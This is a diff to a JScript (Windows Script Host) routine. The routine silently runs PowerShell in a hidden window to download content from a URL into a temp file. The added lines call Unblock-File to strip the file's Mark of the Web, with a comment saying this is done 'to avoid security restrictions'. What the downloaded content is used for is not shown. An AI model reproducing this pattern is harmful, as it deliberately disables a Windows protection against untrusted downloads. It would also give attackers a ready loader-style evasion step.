@@ -377,16 +377,18 @@
                     fso.DeleteFile(tempFile);
                 }
                 
+                // Download file and remove Zone.Identifier to avoid security restrictions
                 var psCmd = 'powershell -Command "$ProgressPreference = \'SilentlyContinue\'; ' +
                            'try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ' +
                            '$content = (New-Object System.Net.WebClient).DownloadString(\'' + url + '\'); ' +
-                           '[System.IO.File]::WriteAllText(\'' + tempFile + '\', $content, [System.Text.Encoding]::UTF8) } ' +
+                           '[System.IO.File]::WriteAllText(\'' + tempFile + '\', $content, [System.Text.Encoding]::UTF8); ' +
+                           'Unblock-File -Path \'' + tempFile + '\' -ErrorAction SilentlyContinue; exit 0 } ' +
                            'catch { exit 1 }"';
                 
                 var result = shell.Run(psCmd, 0, true);
                 
                 if (result === 0 && fso.FileExists(tempFile)) {
-                    // Read as binary to avoid encoding issues
+                    // Now safe to use ADODB.Stream (Zone.Identifier removed)
                     var stream = new ActiveXObject("ADODB.Stream");
                     stream.Type = 2; // Text
                     stream.Charset = "utf-8";
